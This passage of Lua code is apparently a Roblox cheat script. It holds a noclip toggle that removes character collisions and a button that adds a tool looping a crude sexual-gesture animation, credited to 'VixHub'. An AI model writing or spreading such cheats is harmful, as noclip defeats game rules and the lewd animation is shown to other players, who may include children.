                   part.CanCollide = wasColliding
               end
           end
           -- Réinitialiser la table pour éviter des erreurs dans les futurs basculements
           previousCollisions = {}
       end

       -- Toggle noclip on and off dans le bouton
       if noclip then
           disableNoclip()  -- Si noclip est activé, on le désactive et on rétablit les collisions
       else
           enableNoclip()   -- Si noclip est désactivé, on l'active
       end
   end,
})

local Button = Utility:CreateButton({
   Name = "Jerk Off",
   Callback = function()
   --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
local plr = game:GetService("Players").LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:FindFirstChild("Humanoid") or char:WaitForChild("Humanoid")
local anim = hum:FindFirstChildOfClass("Animator") or hum:WaitForChild("Animator")
local pack = plr:FindFirstChild("Backpack") or plr:WaitForChild("Backpack")

if workspace:FindFirstChild("aaa") then
	workspace:FindFirstChild("aaa"):Destroy()
end

local function getmodel()
	return hum.RigType == Enum.HumanoidRigType.R15 and "R15" or "R6"
end

local function Notify(Title, Text, Duration)
	game:GetService('StarterGui'):SetCore('SendNotification', {
        Title = Title,
        Text = Text or '',
        Duration = Duration}
    )
end	

Notify("Script made by", "VixHub", 20)

local animation = Instance.new("Animation")
animation.Name = "aaa"
animation.Parent = workspace

animation.AnimationId = getmodel() == "R15" and "rbxassetid://698251653" or "rbxassetid://72042024"

local tool = Instance.new("Tool")
tool.Name = "Jerk"
tool.RequiresHandle = false
tool.Parent = pack

local doing = false
local animtrack = nil

tool.Equipped:Connect(function()
	doing = true
	while doing do
		if not animtrack then
			animtrack = anim:LoadAnimation(animation)
		end

		animtrack:Play()
		animtrack:AdjustSpeed(0.7)
		animtrack.TimePosition = 0.6

		task.wait(0.1)
		while doing and animtrack and animtrack.TimePosition < 0.7 do
			task.wait(0.05)
		end

		if animtrack then
			animtrack:Stop()
			animtrack:Destroy()
			animtrack = nil
		end
	end
end)

tool.Unequipped:Connect(function()
	doing = false
	if animtrack then
		animtrack:Stop()
		animtrack:Destroy()
		animtrack = nil
	end
end)

hum.Died:Connect(function()
	doing = false
	if animtrack then
		animtrack:Stop()
		animtrack:Destroy()
		animtrack = nil
	end
end)

   end,
})